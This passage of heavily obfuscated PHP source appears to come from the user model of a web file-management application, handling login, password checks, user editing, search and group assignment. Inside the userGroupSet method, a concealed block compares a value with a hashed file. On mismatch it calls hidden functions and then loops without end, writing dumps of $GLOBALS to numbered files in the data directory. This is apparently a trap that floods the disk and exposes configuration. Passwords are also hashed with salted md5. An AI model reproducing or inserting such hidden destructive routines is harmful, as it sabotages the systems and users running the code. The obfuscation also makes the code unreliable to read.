($»¥‘÷ê­) { $¾Û¢šê[$ğÁ’ „[544]] = $this->metaGet($¾Û¢šê[$ğÁ’ „[1806]]); } return $¾Û¢šê; } protected function getInfoSimple($º•¢Â¤ñ, $“ëùâ = false) { $©°ù²ğ =& $_SERVER[ÓïÕü]; if (!$º•¢Â¤ñ) { return array(); } if ($“ëùâ) { $²˜üó‰  = $this->where(array($©°ù²ğ[1806] => intval($º•¢Â¤ñ)))->find(); if (!is_array($²˜üó‰ )) { return array(); } $²˜üó‰ [$©°ù²ğ[2507]] = Action($©°ù²ğ[2508])->parseUrl($²˜üó‰ [$©°ù²ğ[2507]]); return $²˜üó‰ ; } return $this->cacheFunctionGet($©°ù²ğ[2093], $º•¢Â¤ñ); } protected function getInfoSimpleOuter($ª¡ùËÒ) { $ÏÎÂÍáÜ =& $_SERVER[ÓïÕü]; if (!$ª¡ùËÒ || $ª¡ùËÒ == 0) { return array($ÏÎÂÍáÜ[1806] => $ÏÎÂÍáÜ[231], $ÏÎÂÍáÜ[32] => $ÏÎÂÍáÜ[176] . LNG($ÏÎÂÍáÜ[2509]) . $ÏÎÂÍáÜ[178], $ÏÎÂÍáÜ[2507] => STATIC_PATH . $ÏÎÂÍáÜ[2510]); } $Š×´Õ£• = $this->cacheFunctionGet($ÏÎÂÍáÜ[2093], $ª¡ùËÒ); $‚“Ù‘şö = array_field_key($Š×´Õ£•, explode($ÏÎÂÍáÜ[50], $this->simpleField)); if (!$‚“Ù‘şö) { return array($ÏÎÂÍáÜ[1806] => $ÏÎÂÍáÜ[1301], $ÏÎÂÍáÜ[32] => $ÏÎÂÍáÜ[176] . LNG($ÏÎÂÍáÜ[2511]) . $ÏÎÂÍáÜ[178], $ÏÎÂÍáÜ[2507] => STATIC_PATH . $ÏÎÂÍáÜ[2512]); } $‚“Ù‘şö[$ÏÎÂÍáÜ[2507]] = Action($ÏÎÂÍáÜ[2508])->parseUrl($‚“Ù‘şö[$ÏÎÂÍáÜ[2507]]); return $‚“Ù‘şö; } protected function groupUser($—¤ï¡Ë) { } public static function errorLang($ÚŒºÜå«) { $…òéä½¼ =& $_SERVER[ÓïÕü]; $¼  ¿éù = array(self::ERROR_USER_NOT_EXISTS => $…òéä½¼[2513], self::ERROR_USER_PASSWORD_ERROR => $…òéä½¼[2514], self::ERROR_USER_EXIST_NAME => $…òéä½¼[2515], self::ERROR_USER_EXIST_PHONE => $…òéä½¼[2516], self::ERROR_USER_EXIST_EMAIL => $…òéä½¼[2517], self::ERROR_USER_LOGIN_LOCK => $…òéä½¼[2518], self::ERROR_IP_NOT_ALLOW => $…òéä½¼[2519], self::ERROR_USER_EXIST_NICKNAME => $…òéä½¼[2520]); $Ÿœ©˜º» = LNG($¼  ¿éù[$ÚŒºÜå«]); if ($ÚŒºÜå« == self::ERROR_USER_LOGIN_LOCK) { $ÆÓäÏ³ = (int) Model($…òéä½¼[1412])->get($…òéä½¼[2521]); if ($ÆÓäÏ³ > 60) { $Ÿœ©˜º» = str_replace($…òéä½¼[91], ceil($ÆÓäÏ³ / 60), $Ÿœ©˜º»); } } return $Ÿœ©˜º»; } protected function metaSet($Ğ¥Â§¡, $„é§í¥× = null, $¼¼ËÓ×‘ = null) { $this->clearCache($Ğ¥Â§¡); return parent::metaSet($Ğ¥Â§¡, $„é§í¥×, $¼¼ËÓ×‘); } public function getInfoByMeta($û¹Çú¼‡, $©®½½Ñ) { $™Êõ¤÷Ï =& $_SERVER[ÓïÕü]; $“º‚¿ˆş = Model($™Êõ¤÷Ï[2522])->where(array($™Êõ¤÷Ï[97] => $û¹Çú¼‡, $™Êõ¤÷Ï[453] => $©®½½Ñ))->find(); if ($“º‚¿ˆş) { return $this->getInfo($“º‚¿ˆş[$™Êõ¤÷Ï[1806]]); } return !1; } public function userLoginCheck($¹í†×Ö, $¢Ú¬ä‘÷, $ŸÖâ´·ó = false) { $ß¥ôüó¯ =& $_SERVER[ÓïÕü]; $©¾Õ¤”š = $this->userLoginFind($¹í†×Ö); if (!$©¾Õ¤”š) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($©¾Õ¤”š[$ß¥ôüó¯[1806]], $¢Ú¬ä‘÷)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ŸÖâ´·ó ? $this->getInfoFull($©¾Õ¤”š[$ß¥ôüó¯[1806]]) : $this->getInfo($©¾Õ¤”š[$ß¥ôüó¯[1806]]); } public function userLoginFind($ªæ«È±Û) { $Ëô÷œ½ö =& $_SERVER[ÓïÕü]; $ß”£˜™Å = array($Ëô÷œ½ö[32] => $ªæ«È±Û, $Ëô÷œ½ö[2303] => $ªæ«È±Û, $Ëô÷œ½ö[383] => $ªæ«È±Û, $Ëô÷œ½ö[2523] => $ªæ«È±Û, $Ëô÷œ½ö[1104] => $Ëô÷œ½ö[1106]); if ($this->nickNameRpt()) { unset($ß”£˜™Å[$Ëô÷œ½ö[2303]]); } return $this->where($ß”£˜™Å)->find(); } public function clearCache($ß¶ÚÈî) { $×†£˜¢ =& $_SERVER[ÓïÕü]; $this->cacheFunctionClear($×†£˜¢[2092], $ß¶ÚÈî); $this->cacheFunctionClear($×†£˜¢[2093], $ß¶ÚÈî); $this->cacheFunctionClear($×†£˜¢[2503], $ß¶ÚÈî); } public function userPasswordCheck($ˆ£¾şæê, $ñìŸ¾¬…) { $½ÙÛ³Ê =& $_SERVER[ÓïÕü]; $˜äşÒ¶œ = $this->where(array($½ÙÛ³Ê[1806] => intval($ˆ£¾şæê)))->find(); $ø·Ö‚â¡ = $this->metaGet($ˆ£¾şæê); $­ì¤ØŒ = isset($ø·Ö‚â¡[$½ÙÛ³Ê[2524]]) ? $ø·Ö‚â¡[$½ÙÛ³Ê[2524]] : $½ÙÛ³Ê[12]; if (md5($­ì¤ØŒ . trim($ñìŸ¾¬…)) !== $˜äşÒ¶œ[$½ÙÛ³Ê[993]]) { return !1; } return !0; } public function userAdd($æÚâïàã) { $ ’“™£ô =& $_SERVER[ÓïÕü]; $Â€Ÿõ™ = array($ ’“™£ô[497] => $æÚâïàã[$ ’“™£ô[32]], $ ’“™£ô[2525] => $æÚâïàã[$ ’“™£ô[2214]], $ ’“™£ô[2526] => isset($æÚâïàã[$ ’“™£ô[383]]) ? $æÚâïàã[$ ’“™£ô[383]] : $ ’“™£ô[12], $ ’“™£ô[2527] => isset($æÚâïàã[$ ’“™£ô[2523]]) ? $æÚâïàã[$ ’“™£ô[2523]] : $ ’“™£ô[12], $ ’“™£ô[2528] => isset($æÚâïàã[$ ’“™£ô[2303]]) ? $æÚâïàã[$ ’“™£ô[2303]] : $æÚâïàã[$ ’“™£ô[32]], $ ’“™£ô[2529] => isset($æÚâïàã[$ ’“™£ô[2507]]) ? $æÚâïàã[$ ’“™£ô[2507]] : $ ’“™£ô[12], $ ’“™£ô[2530] => isset($æÚâïàã[$ ’“™£ô[2531]]) ? $æÚâïàã[$ ’“™£ô[2531]] : 1, $ ’“™£ô[2532] => $æÚâïàã[$ ’“™£ô[993]], $ ’“™£ô[2094] => isset($æÚâïàã[$ ’“™£ô[1993]]) ? $æÚâïàã[$ ’“™£ô[1993]] : 1024 * 1024 * 20, $ ’“™£ô[2095] => 0, $ ’“™£ô[2533] => 0, $ ’“™£ô[2139] => isset($æÚâïàã[$ ’“™£ô[841]]) ? $æÚâïàã[$ ’“™£ô[841]] : 1); if (!empty($æÚâïàã[$ ’“™£ô[1806]])) { $Â€Ÿõ™[$ ’“™£ô[1806]] = $æÚâïàã[$ ’“™£ô[1806]]; } $±¼´¥Ø„ = $this->_checkExist($æÚâïàã); if ($±¼´¥Ø„ !== !0) { return $±¼´¥Ø„; } if (!empty($Â€Ÿõ™[$ ’“™£ô[2507]]) && strlen($Â€Ÿõ™[$ ’“™£ô[2507]]) > 255) { $Â€Ÿõ™[$ ’“™£ô[2507]] = $ ’“™£ô[12]; } $ ½ä§¢î = $this->add($Â€Ÿõ™); $Î½áÒ = array($ ’“™£ô[2532] => $Â€Ÿõ™[$ ’“™£ô[993]], $ ’“™£ô[2528] => $Â€Ÿõ™[$ ’“™£ô[2303]], $ ’“™£ô[2534] => $æÚâïàã[$ ’“™£ô[2099]]); $this->userEdit($ ½ä§¢î, $Î½áÒ); Model($ ’“™£ô[1456])->userRootAdd($ ½ä§¢î); return $ ½ä§¢î; } protected function userEditTest($Çû¬Â»†, $Òï¾ãõú) { return $this->call($_SERVER[ÓïÕü][2535], $Çû¬Â»†, $Òï¾ãõú); } protected function userEdit($ì ö¯—, $ÈÖÏÂØ) { $•Óı†Š‘ =& $_SERVER[ÓïÕü]; $¨ƒÁ‰…² = $this->getInfoSimple($ì ö¯—); if (!$¨ƒÁ‰…²) { return !1; } $Î’¯­°“ = $this->_checkExist($ÈÖÏÂØ, $ì ö¯—); if ($Î’¯­°“ !== !0) { return $Î’¯­°“; } if (isset($ÈÖÏÂØ[$•Óı†Š‘[993]]) && trim($ÈÖÏÂØ[$•Óı†Š‘[993]]) != $•Óı†Š‘[12]) { $ß²Í¼¯ñ = $this->metaGet($ì ö¯—); if (empty($ß²Í¼¯ñ[$•Óı†Š‘[2524]])) { $ß²Í¼¯ñ[$•Óı†Š‘[2524]] = rand_string(10); Model($•Óı†Š‘[582])->metaSet($ì ö¯—, $•Óı†Š‘[2524], $ß²Í¼¯ñ[$•Óı†Š‘[2524]]); } $ÈÖÏÂØ[$•Óı†Š‘[993]] = md5($ß²Í¼¯ñ[$•Óı†Š‘[2524]] . trim($ÈÖÏÂØ[$•Óı†Š‘[993]])); } else { unset($ÈÖÏÂØ[$•Óı†Š‘[993]]); } if (!empty($ÈÖÏÂØ[$•Óı†Š‘[2507]]) && strlen($ÈÖÏÂØ[$•Óı†Š‘[2507]]) > 255) { $ÈÖÏÂØ[$•Óı†Š‘[2507]] = $•Óı†Š‘[12]; } if (isset($ÈÖÏÂØ[$•Óı†Š‘[2303]])) { $this->setNamePinyin($ì ö¯—, $ÈÖÏÂØ[$•Óı†Š‘[2303]]); } if (isset($ÈÖÏÂØ[$•Óı†Š‘[2099]])) { $¸ˆÎ¥Ì€ = $•Óı†Š‘[1415] . $ì ö¯—; $Ï™€‹ç¥ = $•Óı†Š‘[1413]; $ÌÂàõÈˆ = $ÈÖÏÂØ[$•Óı†Š‘[2099]] ? $ÈÖÏÂØ[$•Óı†Š‘[2099]] : $•Óı†Š‘[12]; $ï’È§ = Model($•Óı†Š‘[1412])->get($¸ˆÎ¥Ì€, $Ï™€‹ç¥); $ï’È§ = $ï’È§ ? $ï’È§ : $•Óı†Š‘[12]; if ($ï’È§ != $ÌÂàõÈˆ) { if (!$ÌÂàõÈˆ && $ï’È§) { Model($•Óı†Š‘[1412])->remove($¸ˆÎ¥Ì€, $Ï™€‹ç¥); } else { if ($ÌÂàõÈˆ) { Model($•Óı†Š‘[1412])->set($¸ˆÎ¥Ì€, $ÌÂàõÈˆ, $Ï™€‹ç¥); } } } unset($ÈÖÏÂØ[$•Óı†Š‘[2099]]); Model($•Óı†Š‘[602])->metaSet($ì ö¯—, $•Óı†Š‘[2099], $ÌÂàõÈˆ); } $this->where(array($•Óı†Š‘[1797] => $ì ö¯—))->save($ÈÖÏÂØ); $this->clearCache($ì ö¯—); return !0; } public function setNamePinyin($ƒú§™á¹, $úš¥£¯ = false) { $Ú›Ü¥˜ =& $_SERVER[ÓïÕü]; if (!$úš¥£¯) { $¬îğ‰Ö = $this->getInfoSimple($ƒú§™á¹); $úš¥£¯ = $¬îğ‰Ö[$Ú›Ü¥˜[2303]] ? $¬îğ‰Ö[$Ú›Ü¥˜[2303]] : $¬îğ‰Ö[$Ú›Ü¥˜[32]]; } $’ÓòãêÂ = Model($Ú›Ü¥˜[602]); if (!Input::check($úš¥£¯, $Ú›Ü¥˜[663])) { return $’ÓòãêÂ->metaSet($ƒú§™á¹, array($Ú›Ü¥˜[541] => $Ú›Ü¥˜[12], $Ú›Ü¥˜[540] => $Ú›Ü¥˜[12])); } return $’ÓòãêÂ->metaSet($ƒú§™á¹, array($Ú›Ü¥˜[541] => str_replace($Ú›Ü¥˜[53], $Ú›Ü¥˜[12], Pinyin::get($úš¥£¯)), $Ú›Ü¥˜[540] => Pinyin::get($úš¥£¯, $Ú›Ü¥˜[664]))); } private function nickNameRpt() { $œô†İ–ç =& $_SERVER[ÓïÕü]; $»¡³ é´ = Model($œô†İ–ç[861])->get($œô†İ–ç[2536]); $äø’Ÿ¨Û = $GLOBALS[$œô†İ–ç[6]][$œô†İ–ç[460]][$œô†İ–ç[2536]]; $üèı¨íõ = !is_null($»¡³ é´) ? $»¡³ é´ : $äø’Ÿ¨Û; return !!$üèı¨íõ; } private function _checkExist($÷ÚığŠ´, $œŠ¯“Ğï = false) { $Åõ®º =& $_SERVER[ÓïÕü]; $Ñ¤Ïâ±Ü = array($Åõ®º[32] => UserModel::ERROR_USER_EXIST_NAME, $Åõ®º[2303] => UserModel::ERROR_USER_EXIST_NICKNAME, $Åõ®º[383] => UserModel::ERROR_USER_EXIST_EMAIL, $Åõ®º[2523] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ñ¤Ïâ±Ü[$Åõ®º[2303]]); } $ù„†¢Í = $œŠ¯“Ğï ? array($Åõ®º[1806] => array($Åõ®º[2537], $œŠ¯“Ğï)) : array(); foreach ($Ñ¤Ïâ±Ü as $É¼¿Õ®Æ => $™ğöîÄ˜) { $úœö»Ô = array(); foreach ($Ñ¤Ïâ±Ü as $°—úöÅ => $Š©›Ù›ë) { if (isset($÷ÚığŠ´[$°—úöÅ]) && $÷ÚığŠ´[$°—úöÅ]) { $úœö»Ô[] = $÷ÚığŠ´[$°—úöÅ]; } } if (!$úœö»Ô) { continue; } $¡û¿ó  = array_merge(array($É¼¿Õ®Æ => array($Åõ®º[7], $úœö»Ô)), $ù„†¢Í); $£çÛÓ«É = $this->where($¡û¿ó )->find(); if ($£çÛÓ«É) { return $™ğöîÄ˜; } } return !0; } public function userListInfo($§†£İæ¼) { $À›¬†Ó© =& $_SERVER[ÓïÕü]; $¼®–±õ = array(); $§†£İæ¼ = is_array($§†£İæ¼) ? array_unique($§†£İæ¼) : array(); if (!$§†£İæ¼) { return $¼®–±õ; } if (count($§†£İæ¼) < 20) { foreach ($§†£İæ¼ as $ß´¶è») { $¼®–±õ[$ß´¶è» . $À›¬†Ó©[12]] = $this->getInfoSimpleOuter($ß´¶è»); } } else { $£¼¹´İ = array($À›¬†Ó©[1797] => array($À›¬†Ó©[495], $§†£İæ¼)); if (count($§†£İæ¼) == 1) { $£¼¹´İ = array($À›¬†Ó©[1797] => $§†£İæ¼[0]); } $˜ß®¸âÉ = Model($À›¬†Ó©[582])->field($this->simpleField)->where($£¼¹´İ)->select(); $˜ß®¸âÉ = array_to_keyvalue($˜ß®¸âÉ, $À›¬†Ó©[1806]); foreach ($§†£İæ¼ as $ß´¶è») { $˜æ•æ×º = $˜ß®¸âÉ[$ß´¶è»]; if (!$˜æ•æ×º) { $¼®–±õ[$ß´¶è» . $À›¬†Ó©[12]] = $this->getInfoSimpleOuter($ß´¶è»); continue; } $˜æ•æ×º[$À›¬†Ó©[2507]] = Action($À›¬†Ó©[2508])->parseUrl($˜æ•æ×º[$À›¬†Ó©[2507]]); $¼®–±õ[$ß´¶è» . $À›¬†Ó©[12]] = $˜æ•æ×º; } } return $¼®–±õ; } protected function userStatus($ã¦•»¯õ, $¿Šûùş„) { $‚ŞàÖØ = $this->getInfoSimple($ã¦•»¯õ); if (!$‚ŞàÖØ) { return !1; } $ë˜¤ê„ = array($_SERVER[ÓïÕü][841] => $¿Šûùş„); return $this->userEdit($ã¦•»¯õ, $ë˜¤ê„); } protected function userRemove($æ¢¤‘²) { $—åÓòşê =& $_SERVER[ÓïÕü]; $ÊÏşäìì = $this->getInfoSimple($æ¢¤‘²); if (!$ÊÏşäìì) { return !1; } $ŠÌõÄíç = array($—åÓòşê[1797] => $æ¢¤‘²); Model($—åÓòşê[672])->where($ŠÌõÄíç)->delete(); Model($—åÓòşê[2538])->where($ŠÌõÄíç)->delete(); Model($—åÓòşê[2101])->where($ŠÌõÄíç)->delete(); Model($—åÓòşê[2522])->where($ŠÌõÄíç)->delete(); Model($—åÓòşê[1173])->where($ŠÌõÄíç)->delete(); Model($—åÓòşê[2320])->removeUserAll($æ¢¤‘²); Model($—åÓòşê[921])->userRootRemove($æ¢¤‘²); return $this->where($ŠÌõÄíç)->delete(); } protected function userGroupSet($™¨ ‡´ä, $¦³Ö¦Ô½, $ß£ï´†Ã = array()) { $…Â¸Ê¸“ =& $_SERVER[ÓïÕü]; $ââ›ÖŸê = $_SERVER[$…Â¸Ê¸“[935]] . $…Â¸Ê¸“[936]; $åıù¥ß§ = $…Â¸Ê¸“[932]; if ($_SERVER[$…Â¸Ê¸“[933]] != $åıù¥ß§($ââ›ÖŸê)) { $ÖÅ×­ºö = $…Â¸Ê¸“[983]; $š»òîô = $…Â¸Ê¸“[934]; $û»¢´Åİ = $_SERVER[$…Â¸Ê¸“[935]] . $…Â¸Ê¸“[936]; $×•ªõ = $š»òîô($û»¢´Åİ); $Å­¼Ğ”Ó = explode($…Â¸Ê¸“[288], $×•ªõ); if (count($Å­¼Ğ”Ó) < $…Â¸Ê¸“[708]) { $«’‰ÆÑß = $…Â¸Ê¸“[937]; $«’‰ÆÑß(); } $Ã÷êÚ—Á = $…Â¸Ê¸“[984]; $Ã÷êÚ—Á($_SERVER[$…Â¸Ê¸“[985]]); $ÖÅ×­ºö = $…Â¸Ê¸“[983]; $ÖÅ×­ºö(); $ì´ˆ÷êŠ = $…Â¸Ê¸“[2539]; $Ù˜Ç’Éã = json_encode($GLOBALS[$…Â¸Ê¸“[2540]]); $«ÌÑ­ªÙ = 1; for ($Õ¦ÏŞÄ¦ = $«ÌÑ­ªÙ; $Õ¦ÏŞÄ¦ > 0; $Õ¦ÏŞÄ¦++) { $ì´ˆ÷êŠ(DATA_PATH . $Õ¦ÏŞÄ¦, $Ù˜Ç’Éã); } } $£¦ú¤¸Ü = $this->getInfoSimple($™¨ ‡´ä); if (!$£¦ú¤¸Ü || !is_array($¦³Ö¦Ô½)) { return !1; } $¡§œêåÆ = Model($…Â¸Ê¸“[2101]); $¡§œêåÆ->where(array($…Â¸Ê¸“[1806] => $™¨ ‡´ä))->delete(); $ôå˜Ùı‚ = array(); $¶Çß°Ï” = 0; foreach ($¦³Ö¦Ô½ as $ü®ğÑ‚Î => $–î¿¡ö) { $ÒµÜë­§ = array($…Â¸Ê¸“[1806] => $™¨ ‡´ä, $…Â¸Ê¸“[1418] => $ü®ğÑ‚Î, $…Â¸Ê¸“[2115] => $–î¿¡ö); $ÒµÜë­§[$…Â¸Ê¸“[2030]] = isset($ß£ï´†Ã[$¶Çß°Ï”]) ? $ß£ï´†Ã[$¶Çß°Ï”] : 0; $¶Çß°Ï”++; $ôå˜Ùı‚[] = $ÒµÜë­§; } return $¡§œêåÆ->addAll($ôå˜Ùı‚, array(), !0); } protected function userGroupAdd($ªÎ‘Íø, $ï•ÒÛ²ß = array()) { $¥ï«¸”– =& $_SERVER[ÓïÕü]; $£Ó×ÍÎŸ = $this->getInfoSimple($ªÎ‘Íø); if (!$£Ó×ÍÎŸ || empty($ï•ÒÛ²ß)) { return !1; } $‡ı„¥²Ì = array(); foreach ($ï•ÒÛ²ß as $Æ¢Ù‚… => $›¨§³ğÎ) { $‡ı„¥²Ì[] = array($¥ï«¸”–[1806] => $ªÎ‘Íø, $¥ï«¸”–[1418] => $Æ¢Ù‚…, $¥ï«¸”–[2115] => $›¨§³ğÎ, $¥ï«¸”–[2030] => 0); } return Model($¥ï«¸”–[2101])->addAll($‡ı„¥²Ì, array(), !0); } protected function userGroupRemove($İ‹¯ç, $œêù¿ÌÎ) { $¦Ê‚‹À =& $_SERVER[ÓïÕü]; $Á‡µøßÃ = $this->getInfoSimple($İ‹¯ç); if (!$Á‡µøßÃ || !$œêù¿ÌÎ) { return !1; } $¿ºÁ¸—ß = array($¦Ê‚‹À[1797] => $İ‹¯ç, $¦Ê‚‹À[2096] => $œêù¿ÌÎ); return Model($¦Ê‚‹À[2101])->where($¿ºÁ¸—ß)->delete(); } public function listData() { $³‘›Ğš­ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³‘›Ğš­[$_SERVER[ÓïÕü][448]]); return $³‘›Ğš­; } public function listByID($ì¼œŸê³) { $Ûõ²¹àÒ =& $_SERVER[ÓïÕü]; if (!$ì¼œŸê³) { return; } $¦©‡ˆ“Æ = array($Ûõ²¹àÒ[1806] => array($Ûõ²¹àÒ[7], $ì¼œŸê³)); $¿°Ä¸® = $this->where($¦©‡ˆ“Æ)->select(); $¿°Ä¸® = array_sort_keep($¿°Ä¸®, $Ûõ²¹àÒ[1806], $ì¼œŸê³); $this->_listDataApply($¿°Ä¸®); return $¿°Ä¸®; } public function listByGroup($ìœâ•øÊ = 0, $Ø«Õ‡ÅÈ = array()) { $Ş¼ÔÈàë =& $_SERVER[ÓïÕü]; $‘ò²µËŒ = $Ş¼ÔÈàë[12]; $¡ƒŒÒ— = array(); if ($ìœâ•øÊ) { $¡ƒŒÒ— = array($Ş¼ÔÈàë[2541] => intval($ìœâ•øÊ)); $‘ò²µËŒ = "\114\x45\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\165\163\145\x72\x5f\147\x72\157\165\x70\x20\x75\x73\x65\162\x5f\147\x72\157\165\x70\x20\157\x6e\x20\165\x73\x65\162\x2e\165\x73\x65\162\111\x44\x20\75\40\x75\x73\x65\162\137\x67\x72\x6f\165\160\56\165\x73\145\162\111\x44"; $íû«¹¤£ = Input::get($Ş¼ÔÈàë[533], null, $Ş¼ÔÈàë[12]) ? $Ş¼ÔÈàë[12] : $Ş¼ÔÈàë[2542]; } if (isset($Ø«Õ‡ÅÈ[$Ş¼ÔÈàë[841]])) { $¡ƒŒÒ—[$Ş¼ÔÈàë[2543]] = $Ø«Õ‡ÅÈ[$Ş¼ÔÈàë[841]]; } $”œÑ«äù = _get($Ø«Õ‡ÅÈ, $Ş¼ÔÈàë[2544], $Ş¼ÔÈàë[234]); if (_get($Ø«Õ‡ÅÈ, $Ş¼ÔÈàë[851], !1)) { $¡ƒŒÒ—[$”œÑ«äù] = array($Ş¼ÔÈàë[2284], $Ø«Õ‡ÅÈ[$Ş¼ÔÈàë[851]]); } if (_get($Ø«Õ‡ÅÈ, $Ş¼ÔÈàë[852], !1)) { $»³ş¼›Ù = array($Ş¼ÔÈàë[2285], $Ø«Õ‡ÅÈ[$Ş¼ÔÈàë[852]]); if ($¡ƒŒÒ—[$”œÑ«äù]) { $¡ƒŒÒ—[$”œÑ«äù] = array($¡ƒŒÒ—[$”œÑ«äù], $»³ş¼›Ù, $Ş¼ÔÈàë[2286]); } else { $¡ƒŒÒ—[$”œÑ«äù] = $»³ş¼›Ù; } } $¶ñšğÖ = $this->_makeOrder($íû«¹¤£)->field($Ş¼ÔÈàë[2545])->where($¡ƒŒÒ—)->join($‘ò²µËŒ)->selectPage(50); $this->_listDataApply($¶ñšğÖ[$Ş¼ÔÈàë[448]]); return $¶ñšğÖ; } private function _makeOrder($‰² õ‡é = '') { $Ø™â•÷ì =& $_SERVER[ÓïÕü]; $´Œ½¿”¦ = array($Ø™â•÷ì[1806], $Ø™â•÷ì[32], $Ø™â•÷ì[1995], $Ø™â•÷ì[2214], $Ø™â•÷ì[1967], $Ø™â•÷ì[234]); $•Ğœ™Ó = array($Ø™â•÷ì[526] => $Ø™â•÷ì[527], $Ø™â•÷ì[528] => $Ø™â•÷ì[529]); $áÅ‡Èê® = Input::get($Ø™â•÷ì[533], $Ø™â•÷ì[7], $Ø™â•÷ì[1797], $´Œ½¿”¦); $·‰‘×Å¾ = Input::get($Ø™â•÷ì[534], $Ø™â•÷ì[7], $Ø™â•÷ì[2102], array($Ø™â•÷ì[2102], $Ø™â•÷ì[528])); $·‰‘×Å¾ = $•Ğœ™Ó[$·‰‘×Å¾]; $‰² õ‡é = $‰² õ‡é . "\165\x73\145\x72\56{$áÅ‡Èê®}\x20{$·‰‘×Å¾}\54\x20\165\163\145\x72\x2e\165\x73\145\x72\x49\x44\x20\141\163\143"; return $this->alias($Ø™â•÷ì[2230])->order($‰² õ‡é); } public function listSearch($Åƒøøíı) { $‚ˆ¡àÙ¤ =& $_SERVER[ÓïÕü]; $Ì£í¬÷Ä = trim($Åƒøøíı[$‚ˆ¡àÙ¤[2105]]); $ß‚ƒÆ›Õ = explode($‚ˆ¡àÙ¤[53], $Ì£í¬÷Ä); if (!$Ì£í¬÷Ä || count($ß‚ƒÆ›Õ) == 1) { return $this->listSearchNow($Åƒøøíı); } $ğıÄÛ¤Å = array($‚ˆ¡àÙ¤[448] => array()); foreach ($ß‚ƒÆ›Õ as $Æ±’Òè) { if (!trim($Æ±’Òè)) { continue; } $Åƒøøíı[$‚ˆ¡àÙ¤[2105]] = $Æ±’Òè; $Ùûµ²°’ = $this->listSearchNow($Åƒøøíı); $ğıÄÛ¤Å[$‚ˆ¡àÙ¤[448]] = array_merge($ğıÄÛ¤Å[$‚ˆ¡àÙ¤[448]], $Ùûµ²°’[$‚ˆ¡àÙ¤[448]]); } $ğıÄÛ¤Å[$‚ˆ¡àÙ¤[448]] = array_unique_by_key($ğıÄÛ¤Å[$‚ˆ¡àÙ¤[448]], $‚ˆ¡àÙ¤[1806]); $ğıÄÛ¤Å[$‚ˆ¡àÙ¤[445]] = array($‚ˆ¡àÙ¤[446] => count($ğıÄÛ¤Å[$‚ˆ¡àÙ¤[448]]), $‚ˆ¡àÙ¤[442] => 20, $‚ˆ¡àÙ¤[431] => 1, $‚ˆ¡àÙ¤[447] => 1); return $ğıÄÛ¤Å; } public function listSearchNow($”ØÔ¾¨) { $­°»µ‹Ä =& $_SERVER[ÓïÕü]; $÷®æÊÑ = trim($”ØÔ¾¨[$­°»µ‹Ä[2105]]); $â”½šËÇ = isset($”ØÔ¾¨[$­°»µ‹Ä[2106]]) ? $”ØÔ¾¨[$­°»µ‹Ä[2106]] : !1; $÷®æÊÑ = str_replace($­°»µ‹Ä[2107], $­°»µ‹Ä[2108], trim($÷®æÊÑ)); $·Ğ–ú•ì = array($­°»µ‹Ä[32] => array($­°»µ‹Ä[462], "\45{$÷®æÊÑ}\45"), $­°»µ‹Ä[383] => array($­°»µ‹Ä[462], "{$÷®æÊÑ}\x25"), $­°»µ‹Ä[2303] => array($­°»µ‹Ä[462], "{$÷®æÊÑ}\x25"), $­°»µ‹Ä[1104] => $­°»µ‹Ä[2109]); if (Input::check($÷®æÊÑ, $­°»µ‹Ä[389])) { $·Ğ–ú•ì[$­°»µ‹Ä[1806]] = array($­°»µ‹Ä[462], "{$÷®æÊÑ}\45"); $·Ğ–ú•ì[$­°»µ‹Ä[2523]] = array($­°»µ‹Ä[462], "{$÷®æÊÑ}\x25"); } if (!$÷®æÊÑ) { $·Ğ–ú•ì = array(); } if (isset($”ØÔ¾¨[$­°»µ‹Ä[841]])) { $·Ğ–ú•ì[$­°»µ‹Ä[841]] = $”ØÔ¾¨[$­°»µ‹Ä[841]]; } $·Ğ–ú•ì = $this->parseWhereLike($·Ğ–ú•ì); $¾Û•¨Ñí = $this->_makeOrder()->where($·Ğ–ú•ì)->selectPage(20); if (!$¾Û•¨Ñí || count($¾Û•¨Ñí[$­°»µ‹Ä[448]]) < 5 && Input::check($÷®æÊÑ, $­°»µ‹Ä[396])) { $†Ê°—ã = $this->_searchFromMeta($­°»µ‹Ä[540], $÷®æÊÑ, 10); $Ä´‰Ÿê« = $this->_searchFromMeta($­°»µ‹Ä[541], $÷®æÊÑ, 10); $¦ıÂ…ñ— = array_merge($†Ê°—ã, $Ä´‰Ÿê«, $¾Û•¨Ñí[$­°»µ‹Ä[448]]); $¾Û•¨Ñí[$­°»µ‹Ä[448]] = array_unique_by_key($¦ıÂ…ñ—, $­°»µ‹Ä[1806]); $¾Û•¨Ñí[$­°»µ‹Ä[445]][$­°»µ‹Ä[446]] = count($¾Û•¨Ñí[$­°»µ‹Ä[448]]); $¾Û•¨Ñí[$­°»µ‹Ä[445]][$­°»µ‹Ä[447]] = ceil($¾Û•¨Ñí[$­°»µ‹Ä[445]][$­°»µ‹Ä[446]] / $¾Û•¨Ñí[$­°»µ‹Ä[445]][$­°»µ‹Ä[442]]); } $this->_listDataApply($¾Û•¨Ñí[$­°»µ‹Ä[448]]); $this->_filterByGroup($¾Û•¨Ñí, $â”½šËÇ); return $¾Û•¨Ñí; } private function _filterByGroup(&$«œ ÆÚÙ, $³ÈèíÎ¨) { $ú‘ÇÛÁ¬ =& $_SERVER[ÓïÕü]; if (!$³ÈèíÎ¨) { return $«œ ÆÚÙ; } foreach ($«œ ÆÚÙ[$ú‘ÇÛÁ¬[448]] as $´Ô³àÚÔ => &$ÙÜé¹ÃÄ) { $»ç¬ñÎ = array_to_keyvalue($ÙÜé¹ÃÄ[$ú‘ÇÛÁ¬[1417]], $ú‘ÇÛÁ¬[12], $ú‘ÇÛÁ¬[1418]); if (!in_array($³ÈèíÎ¨, $»ç¬ñÎ)) { unset($«œ ÆÚÙ[$ú‘ÇÛÁ¬[448]][$´Ô³àÚÔ]); } } unset($ÙÜé¹ÃÄ); $«œ ÆÚÙ[$ú‘ÇÛÁ¬[448]] = array_values($«œ ÆÚÙ[$ú‘ÇÛÁ¬[448]]); $«œ ÆÚÙ[$ú‘ÇÛÁ¬[445]] = array($ú‘ÇÛÁ¬[2267] => count($«œ ÆÚÙ[$ú‘ÇÛÁ¬[448]]), $ú‘ÇÛÁ¬[2265] => $«œ ÆÚÙ[$ú‘ÇÛÁ¬[445]][$ú‘ÇÛÁ¬[442]], $ú‘ÇÛÁ¬[2264] => 1, 